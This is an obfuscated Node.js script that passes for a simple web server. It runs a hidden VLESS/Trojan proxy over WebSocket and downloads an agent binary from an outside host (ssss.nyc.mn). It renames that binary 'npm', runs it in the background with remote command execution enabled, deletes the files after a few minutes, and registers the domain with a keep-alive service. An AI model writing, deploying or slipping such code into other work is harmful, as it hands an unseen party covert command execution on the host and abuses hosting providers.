const _0x4d53b5=_0x3de0;(function(_0x52d370,_0x5cffaa){const _0x2a1fff=_0x3de0,_0x5e978c=_0x52d370();while(!![]){try{const _0x3c3d27=parseInt(_0x2a1fff(0xe0))/0x1*(parseInt(_0x2a1fff(0xc8))/0x2)+parseInt(_0x2a1fff(0xdd))/0x3+-parseInt(_0x2a1fff(0xbe))/0x4+parseInt(_0x2a1fff(0x7e))/0x5*(parseInt(_0x2a1fff(0xe8))/0x6)+parseInt(_0x2a1fff(0xf0))/0x7+parseInt(_0x2a1fff(0xa1))/0x8*(-parseInt(_0x2a1fff(0xad))/0x9)+-parseInt(_0x2a1fff(0xe6))/0xa;if(_0x3c3d27===_0x5cffaa)break;else _0x5e978c['push'](_0x5e978c['shift']());}catch(_0x16f982){_0x5e978c['push'](_0x5e978c['shift']());}}}(_0x566a,0x19843));function _0x566a(){const _0x194467=['Hug','npm\x20is\x20already\x20running,\x20skip\x20running...','AUTO_ACCESS','vless://','&path=%2F','createWriteStream','Automatic\x20Access\x20Task\x20added\x20successfully','unlink','createServer','DOMAIN','utf-8','join','60424wMaqJB','\x20with\x20all\x20DNS\x20servers','Unknown','get','NEZHA_SERVER','catch','length','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','yu782798','2rIZeoY','SUB_PATH','text/html','close','end','2087','readFile',':443?encryption=none&security=tls&sni=','crypto','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','type','443','net','asOrganization','path','connection','https://','npm','npm\x20running\x20error:','Answer','map','82236tttjOK','npm\x20download\x20successfully','8.8.4.4','197233SPFDRk',':443?security=tls&sni=','pipe','Server','arch','Server\x20is\x20running\x20on\x20port\x20','512410HXBaYO','log','5610kOkNQj','NAME','https://amd64.ssss.nyc.mn/agent','slice','update','send','2096','test','423570UCUwOP','digest','client_secret:\x20','stream','arm','hex','writeHead','&fp=chrome&type=ws&host=','config.yaml','15qBTzLT','readUInt16BE','WSPATH','trojan://','216c2f22-5f13-4394-bb8a-1b2a6fe86b6d','https://speed.cloudflare.com/meta','https://arm64.ssss.nyc.mn/v1','https://amd64.ssss.nyc.mn/v1','every','8443','split','1234.abc.com','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','data','writeFileSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://arm64.ssss.nyc.mn/agent','then','text/plain','connect','true','createHash','error','2053','https://dns.google/resolve?name=','&type=A','substr','once','env','write','--tls','buffer','setsid\x20nohup\x20./npm\x20-s\x20','UUID','sha224','8SKlLRH','child_process','http','trim','Hello\x20world!','replace','readUInt8','country','1.1.1.1','error:\x20','chmod\x20+x\x20npm','index.html','1053882xExWSp','Not\x20Found\x0a','includes','url','toString'];_0x566a=function(){return _0x194467;};return _0x566a();}const os=require('os'),http=require(_0x4d53b5(0xa3)),fs=require('fs'),axios=require('axios'),net=require(_0x4d53b5(0xd4)),path=require(_0x4d53b5(0xd6)),crypto=require(_0x4d53b5(0xd0)),{Buffer}=require(_0x4d53b5(0x9d)),{exec,execSync}=require(_0x4d53b5(0xa2)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x4d53b5(0x9a)][_0x4d53b5(0x9f)]||_0x4d53b5(0x82),NEZHA_SERVER=process['env'][_0x4d53b5(0xc2)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x4d53b5(0x9a)]['NEZHA_KEY']||'',DOMAIN=process[_0x4d53b5(0x9a)][_0x4d53b5(0xbb)]||_0x4d53b5(0x89),AUTO_ACCESS=process['env'][_0x4d53b5(0xb4)]||!![],WSPATH=process[_0x4d53b5(0x9a)][_0x4d53b5(0x80)]||UUID[_0x4d53b5(0xeb)](0x0,0x8),SUB_PATH=process[_0x4d53b5(0x9a)][_0x4d53b5(0xc9)]||_0x4d53b5(0xc7),NAME=process[_0x4d53b5(0x9a)][_0x4d53b5(0xe9)]||_0x4d53b5(0xb2),PORT=process[_0x4d53b5(0x9a)]['PORT']||0x1eb4;let ISP='';function _0x3de0(_0x1677d2,_0x4ac1e5){const _0x566a51=_0x566a();return _0x3de0=function(_0x3de0b4,_0x4c5e34){_0x3de0b4=_0x3de0b4-0x7c;let _0x1456d0=_0x566a51[_0x3de0b4];return _0x1456d0;},_0x3de0(_0x1677d2,_0x4ac1e5);}const GetISP=async()=>{const _0x526a55=_0x4d53b5;try{const _0x35b9e8=await axios[_0x526a55(0xc1)](_0x526a55(0x83)),_0x1b97f5=_0x35b9e8[_0x526a55(0x8b)];ISP=(_0x1b97f5[_0x526a55(0xa8)]+'-'+_0x1b97f5[_0x526a55(0xd5)])[_0x526a55(0xa6)](/ /g,'_');}catch(_0x371347){ISP=_0x526a55(0xc0);}};GetISP();const httpServer=http[_0x4d53b5(0xba)]((_0x49ee71,_0x24063f)=>{const _0x425c63=_0x4d53b5;if(_0x49ee71[_0x425c63(0xb0)]==='/'){const _0x1d7d11=path[_0x425c63(0xbd)](__dirname,_0x425c63(0xac));fs[_0x425c63(0xce)](_0x1d7d11,'utf8',(_0x5111bf,_0x4bc053)=>{const _0xaac485=_0x425c63;if(_0x5111bf){_0x24063f[_0xaac485(0xf6)](0xc8,{'Content-Type':'text/html'}),_0x24063f[_0xaac485(0xcc)](_0xaac485(0xa5));return;}_0x24063f['writeHead'](0xc8,{'Content-Type':_0xaac485(0xca)}),_0x24063f[_0xaac485(0xcc)](_0x4bc053);});return;}else{if(_0x49ee71[_0x425c63(0xb0)]==='/'+SUB_PATH){const _0x31b706=_0x425c63(0xb5)+UUID+'@'+DOMAIN+_0x425c63(0xcf)+DOMAIN+_0x425c63(0x7c)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x753b67=_0x425c63(0x81)+UUID+'@'+DOMAIN+_0x425c63(0xe1)+DOMAIN+_0x425c63(0x7c)+DOMAIN+_0x425c63(0xb6)+WSPATH+'#'+NAME+'-'+ISP,_0x33888f=_0x31b706+'\x0a'+_0x753b67,_0x44a5d5=Buffer['from'](_0x33888f)[_0x425c63(0xb1)]('base64');_0x24063f[_0x425c63(0xf6)](0xc8,{'Content-Type':_0x425c63(0x90)}),_0x24063f[_0x425c63(0xcc)](_0x44a5d5+'\x0a');}else _0x24063f[_0x425c63(0xf6)](0x194,{'Content-Type':_0x425c63(0x90)}),_0x24063f[_0x425c63(0xcc)](_0x425c63(0xae));}}),wss=new WebSocket[(_0x4d53b5(0xe3))]({'server':httpServer}),uuid=UUID[_0x4d53b5(0xa6)](/-/g,''),DNS_SERVERS=[_0x4d53b5(0xdf),_0x4d53b5(0xa9)];function resolveHost(_0x3d3ebf){return new Promise((_0x50cda5,_0x4da0e0)=>{const _0x154484=_0x3de0;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x154484(0xef)](_0x3d3ebf)){_0x50cda5(_0x3d3ebf);return;}let _0x53e82e=0x0;function _0x5e7b5b(){const _0x1ab27c=_0x154484;if(_0x53e82e>=DNS_SERVERS['length']){_0x4da0e0(new Error('Failed\x20to\x20resolve\x20'+_0x3d3ebf+_0x1ab27c(0xbf)));return;}const _0x2437c2=DNS_SERVERS[_0x53e82e];_0x53e82e++;const _0x2631d2=_0x1ab27c(0x96)+encodeURIComponent(_0x3d3ebf)+_0x1ab27c(0x97);axios[_0x1ab27c(0xc1)](_0x2631d2,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x24e876=>{const _0x104f88=_0x1ab27c,_0x1298ed=_0x24e876[_0x104f88(0x8b)];if(_0x1298ed['Status']===0x0&&_0x1298ed['Answer']&&_0x1298ed[_0x104f88(0xdb)]['length']>0x0){const _0x44763e=_0x1298ed[_0x104f88(0xdb)]['find'](_0x29286e=>_0x29286e[_0x104f88(0xd2)]===0x1);if(_0x44763e){_0x50cda5(_0x44763e[_0x104f88(0x8b)]);return;}}_0x5e7b5b();})[_0x1ab27c(0xc3)](_0x31c115=>{_0x5e7b5b();});}_0x5e7b5b();});}function handleVlessConnection(_0x5f4f1d,_0x1ab1ee){const _0x250cd1=_0x4d53b5,[_0x3830bd]=_0x1ab1ee,_0x1aee83=_0x1ab1ee['slice'](0x1,0x11);if(!_0x1aee83[_0x250cd1(0x86)]((_0x302bc5,_0x54e187)=>_0x302bc5==parseInt(uuid[_0x250cd1(0x98)](_0x54e187*0x2,0x2),0x10)))return![];let _0x30b27a=_0x1ab1ee[_0x250cd1(0xeb)](0x11,0x12)[_0x250cd1(0xa7)]()+0x13;const _0x53771a=_0x1ab1ee[_0x250cd1(0xeb)](_0x30b27a,_0x30b27a+=0x2)[_0x250cd1(0x7f)](0x0),_0x33022b=_0x1ab1ee[_0x250cd1(0xeb)](_0x30b27a,_0x30b27a+=0x1)['readUInt8'](),_0x1fdadd=_0x33022b==0x1?_0x1ab1ee[_0x250cd1(0xeb)](_0x30b27a,_0x30b27a+=0x4)[_0x250cd1(0xbd)]('.'):_0x33022b==0x2?new TextDecoder()['decode'](_0x1ab1ee[_0x250cd1(0xeb)](_0x30b27a+0x1,_0x30b27a+=0x1+_0x1ab1ee[_0x250cd1(0xeb)](_0x30b27a,_0x30b27a+0x1)[_0x250cd1(0xa7)]())):_0x33022b==0x3?_0x1ab1ee[_0x250cd1(0xeb)](_0x30b27a,_0x30b27a+=0x10)['reduce']((_0x3a3386,_0xde5b3a,_0x4094ed,_0xa4fa2b)=>_0x4094ed%0x2?_0x3a3386['concat'](_0xa4fa2b[_0x250cd1(0xeb)](_0x4094ed-0x1,_0x4094ed+0x1)):_0x3a3386,[])[_0x250cd1(0xdc)](_0x2f591c=>_0x2f591c[_0x250cd1(0x7f)](0x0)['toString'](0x10))[_0x250cd1(0xbd)](':'):'';_0x5f4f1d[_0x250cd1(0xed)](new Uint8Array([_0x3830bd,0x0]));const _0x18bb60=createWebSocketStream(_0x5f4f1d);return resolveHost(_0x1fdadd)[_0x250cd1(0x8f)](_0x410250=>{const _0xffa671=_0x250cd1;net[_0xffa671(0x91)]({'host':_0x410250,'port':_0x53771a},function(){const _0x55b5c0=_0xffa671;this[_0x55b5c0(0x9b)](_0x1ab1ee[_0x55b5c0(0xeb)](_0x30b27a)),_0x18bb60['on'](_0x55b5c0(0x94),()=>{})[_0x55b5c0(0xe2)](this)['on'](_0x55b5c0(0x94),()=>{})[_0x55b5c0(0xe2)](_0x18bb60);})['on']('error',()=>{});})['catch'](_0x2e9e33=>{const _0x564241=_0x250cd1;net[_0x564241(0x91)]({'host':_0x1fdadd,'port':_0x53771a},function(){const _0x29799d=_0x564241;this[_0x29799d(0x9b)](_0x1ab1ee[_0x29799d(0xeb)](_0x30b27a)),_0x18bb60['on'](_0x29799d(0x94),()=>{})['pipe'](this)['on']('error',()=>{})[_0x29799d(0xe2)](_0x18bb60);})['on'](_0x564241(0x94),()=>{});}),!![];}function handleTrojanConnection(_0x3e5a2d,_0xb22257){const _0xed4ad=_0x4d53b5;try{if(_0xb22257[_0xed4ad(0xc4)]<0x3a)return![];const _0x3accd9=_0xb22257[_0xed4ad(0xeb)](0x0,0x38)[_0xed4ad(0xb1)](),_0x586259=[UUID];let _0x24dbef=null;for(const _0x4403a0 of _0x586259){const _0xe0deca=crypto[_0xed4ad(0x93)](_0xed4ad(0xa0))[_0xed4ad(0xec)](_0x4403a0)[_0xed4ad(0xf1)](_0xed4ad(0xf5));if(_0xe0deca===_0x3accd9){_0x24dbef=_0x4403a0;break;}}if(!_0x24dbef)return![];let _0x3bee84=0x38;_0xb22257[_0x3bee84]===0xd&&_0xb22257[_0x3bee84+0x1]===0xa&&(_0x3bee84+=0x2);const _0x3a8945=_0xb22257[_0x3bee84];if(_0x3a8945!==0x1)return![];_0x3bee84+=0x1;const _0xe1863=_0xb22257[_0x3bee84];_0x3bee84+=0x1;let _0xb606c3,_0x1d735d;if(_0xe1863===0x1)_0xb606c3=_0xb22257[_0xed4ad(0xeb)](_0x3bee84,_0x3bee84+0x4)[_0xed4ad(0xbd)]('.'),_0x3bee84+=0x4;else{if(_0xe1863===0x3){const _0x56ae13=_0xb22257[_0x3bee84];_0x3bee84+=0x1,_0xb606c3=_0xb22257[_0xed4ad(0xeb)](_0x3bee84,_0x3bee84+_0x56ae13)[_0xed4ad(0xb1)](),_0x3bee84+=_0x56ae13;}else{if(_0xe1863===0x4)_0xb606c3=_0xb22257[_0xed4ad(0xeb)](_0x3bee84,_0x3bee84+0x10)['reduce']((_0x224fa1,_0xa2dd65,_0x341aa7,_0x2ef846)=>_0x341aa7%0x2?_0x224fa1['concat'](_0x2ef846[_0xed4ad(0xeb)](_0x341aa7-0x1,_0x341aa7+0x1)):_0x224fa1,[])[_0xed4ad(0xdc)](_0x47fcbe=>_0x47fcbe[_0xed4ad(0x7f)](0x0)[_0xed4ad(0xb1)](0x10))[_0xed4ad(0xbd)](':'),_0x3bee84+=0x10;else return![];}}_0x1d735d=_0xb22257[_0xed4ad(0x7f)](_0x3bee84),_0x3bee84+=0x2;_0x3bee84<_0xb22257[_0xed4ad(0xc4)]&&_0xb22257[_0x3bee84]===0xd&&_0xb22257[_0x3bee84+0x1]===0xa&&(_0x3bee84+=0x2);const _0x1474b4=createWebSocketStream(_0x3e5a2d);return resolveHost(_0xb606c3)['then'](_0x2b391c=>{const _0x100d39=_0xed4ad;net['connect']({'host':_0x2b391c,'port':_0x1d735d},function(){const _0x1ccd65=_0x3de0;_0x3bee84<_0xb22257[_0x1ccd65(0xc4)]&&this[_0x1ccd65(0x9b)](_0xb22257[_0x1ccd65(0xeb)](_0x3bee84)),_0x1474b4['on']('error',()=>{})[_0x1ccd65(0xe2)](this)['on'](_0x1ccd65(0x94),()=>{})[_0x1ccd65(0xe2)](_0x1474b4);})['on'](_0x100d39(0x94),()=>{});})[_0xed4ad(0xc3)](_0x399628=>{const _0x7da2d2=_0xed4ad;net[_0x7da2d2(0x91)]({'host':_0xb606c3,'port':_0x1d735d},function(){const _0x5191ad=_0x7da2d2;_0x3bee84<_0xb22257[_0x5191ad(0xc4)]&&this[_0x5191ad(0x9b)](_0xb22257['slice'](_0x3bee84)),_0x1474b4['on'](_0x5191ad(0x94),()=>{})[_0x5191ad(0xe2)](this)['on'](_0x5191ad(0x94),()=>{})[_0x5191ad(0xe2)](_0x1474b4);})['on']('error',()=>{});}),!![];}catch(_0x2ce15b){return![];}}wss['on'](_0x4d53b5(0xd7),(_0x549db7,_0x42a676)=>{const _0x46dc7e=_0x4d53b5,_0x4dc3b1=_0x42a676['url']||'';_0x549db7[_0x46dc7e(0x99)]('message',_0x8fc9ce=>{const _0x422252=_0x46dc7e;if(_0x8fc9ce[_0x422252(0xc4)]>0x11&&_0x8fc9ce[0x0]===0x0){const _0x22ba00=_0x8fc9ce[_0x422252(0xeb)](0x1,0x11),_0x42bcdb=_0x22ba00['every']((_0x564a6d,_0x4a9630)=>_0x564a6d==parseInt(uuid[_0x422252(0x98)](_0x4a9630*0x2,0x2),0x10));if(_0x42bcdb){!handleVlessConnection(_0x549db7,_0x8fc9ce)&&_0x549db7[_0x422252(0xcb)]();return;}}!handleTrojanConnection(_0x549db7,_0x8fc9ce)&&_0x549db7['close']();})['on'](_0x46dc7e(0x94),()=>{});});const getDownloadUrl=()=>{const _0x5122fd=_0x4d53b5,_0x226aaf=os[_0x5122fd(0xe4)]();return _0x226aaf===_0x5122fd(0xf4)||_0x226aaf==='arm64'||_0x226aaf==='aarch64'?!NEZHA_PORT?_0x5122fd(0x84):_0x5122fd(0x8e):!NEZHA_PORT?_0x5122fd(0x85):_0x5122fd(0xea);},downloadFile=async()=>{const _0x2d1510=_0x4d53b5;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2952af=getDownloadUrl(),_0x2b1027=await axios({'method':_0x2d1510(0xc1),'url':_0x2952af,'responseType':_0x2d1510(0xf3)}),_0x2d3794=fs[_0x2d1510(0xb7)](_0x2d1510(0xd9));return _0x2b1027[_0x2d1510(0x8b)][_0x2d1510(0xe2)](_0x2d3794),new Promise((_0xf042b1,_0x3e08a6)=>{const _0x4aa730=_0x2d1510;_0x2d3794['on']('finish',()=>{const _0xf05029=_0x3de0;console['log'](_0xf05029(0xde)),exec(_0xf05029(0xab),_0x5851b1=>{if(_0x5851b1)_0x3e08a6(_0x5851b1);_0xf042b1();});}),_0x2d3794['on'](_0x4aa730(0x94),_0x3e08a6);});}catch(_0x5381ea){throw _0x5381ea;}},runnz=async()=>{const _0x1b48e5=_0x4d53b5;try{const _0x4abb58=execSync(_0x1b48e5(0xc6),{'encoding':_0x1b48e5(0xbc)});if(_0x4abb58[_0x1b48e5(0xa4)]()!==''){console['log'](_0x1b48e5(0xb3));return;}}catch(_0x3077fa){}await downloadFile();let _0x2f7b36='',_0x2ff7cf=[_0x1b48e5(0xd3),_0x1b48e5(0x87),_0x1b48e5(0xee),_0x1b48e5(0xcd),'2083',_0x1b48e5(0x95)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5e9c25=_0x2ff7cf[_0x1b48e5(0xaf)](NEZHA_PORT)?_0x1b48e5(0x9c):'';_0x2f7b36=_0x1b48e5(0x9e)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5e9c25+_0x1b48e5(0xd1);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x552932=NEZHA_SERVER[_0x1b48e5(0xaf)](':')?NEZHA_SERVER[_0x1b48e5(0x88)](':')['pop']():'',_0xd40485=_0x2ff7cf[_0x1b48e5(0xaf)](_0x552932)?_0x1b48e5(0x92):'false',_0x1e1de8=_0x1b48e5(0xf2)+NEZHA_KEY+_0x1b48e5(0x8d)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0xd40485+_0x1b48e5(0xc5)+UUID;fs[_0x1b48e5(0x8c)](_0x1b48e5(0x7d),_0x1e1de8);}_0x2f7b36=_0x1b48e5(0x8a);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x2f7b36,{'shell':'/bin/bash'},_0x3c1089=>{const _0x57b1a9=_0x1b48e5;if(_0x3c1089)console['error'](_0x57b1a9(0xda),_0x3c1089);else console[_0x57b1a9(0xe7)]('npm\x20is\x20running');});}catch(_0x290383){console[_0x1b48e5(0x94)](_0x1b48e5(0xaa)+_0x290383);}};async function addAccessTask(){const _0x19ed49=_0x4d53b5;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3302de=_0x19ed49(0xd8)+DOMAIN;try{const _0x17c7ac=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x3302de},{'headers':{'Content-Type':'application/json'}});console[_0x19ed49(0xe7)](_0x19ed49(0xb8));}catch(_0x2b2555){}}const delFiles=()=>{const _0x4476a4=_0x4d53b5;fs[_0x4476a4(0xb9)](_0x4476a4(0xd9),()=>{}),fs[_0x4476a4(0xb9)](_0x4476a4(0x7d),()=>{});};httpServer['listen'](PORT,()=>{const _0x495a42=_0x4d53b5;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x495a42(0xe7)](_0x495a42(0xe5)+PORT);});
